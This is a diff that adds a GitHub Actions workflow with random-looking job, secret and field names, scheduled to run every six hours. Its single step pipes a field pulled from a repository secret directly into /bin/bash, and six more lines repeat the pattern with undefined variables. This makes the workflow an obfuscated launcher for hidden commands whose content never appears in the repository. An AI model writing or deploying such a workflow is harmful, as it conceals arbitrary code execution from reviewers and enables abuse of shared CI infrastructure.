@@ -1,0 +1,23 @@
+name: zhangshancui4657
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangshancui4657
+        env:
+          sbznl59: ${{ secrets.sbznl59 }}
+        run: |
+          echo $sbznl59 | jq -r .jxrnr880 | /bin/bash
+          echo $qh42763 | jq -r .wsjcv675 | /bin/bash
+          echo $b68 | jq -r .h937 | /bin/bash
+          echo $oeod67 | jq -r .vdw6534 | /bin/bash
+          echo $y026 | jq -r .hp7759 | /bin/bash
+          echo $nxdu67603 | jq -r .zcrs91772 | /bin/bash
+          echo $azwh2507 | jq -r .ny97185 | /bin/bash
+
